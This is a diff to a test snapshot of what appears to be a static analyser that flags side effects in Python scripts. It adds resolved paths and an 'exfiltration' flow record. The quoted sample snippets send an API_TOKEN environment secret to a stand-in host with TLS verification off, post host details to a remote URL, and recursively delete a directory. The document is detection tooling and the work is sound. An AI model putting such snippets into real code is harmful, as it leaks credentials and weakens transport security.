@@ -330,7 +330,8 @@ expression: report
       "line": 7,
       "col": 1,
       "snippet": "shutil.rmtree(STAGING, ignore_errors=True)",
-      "note": "recursively deletes a directory; ignore_errors=True — failures pass silently"
+      "note": "recursively deletes a directory; ignore_errors=True — failures pass silently",
+      "resolved": "/tmp/stage"
     },
     {
       "effect": "fs_write",
@@ -341,7 +342,8 @@ expression: report
       "line": 8,
       "col": 1,
       "snippet": "os.makedirs(STAGING)",
-      "note": null
+      "note": null,
+      "resolved": "/tmp/stage"
     },
     {
       "effect": "net",
@@ -352,7 +354,14 @@ expression: report
       "line": 10,
       "col": 8,
       "snippet": "requests.get(\"https://example.invalid/payload\", headers={\"X-Token\":…",
-      "note": "verify=False — TLS certificates are not checked"
+      "note": "sends the secret from env API_TOKEN (line 4) to https://example.invalid/payload; verify=False — TLS certificates are not checked",
+      "resolved": "https://example.invalid/payload",
+      "flow": {
+        "kind": "exfiltration",
+        "secret": "env",
+        "source": "env API_TOKEN",
+        "source_line": 4
+      }
     },
     {
       "effect": "dynamic",
@@ -407,7 +416,8 @@ expression: report
       "line": 19,
       "col": 1,
       "snippet": "requests.post(\"https://example.invalid/report\", json={\"host\": os.uname…",
-      "note": "sends data to a remote host"
+      "note": "sends data to a remote host",
+      "resolved": "https://example.invalid/report"
     },
     {
       "effect": "env",
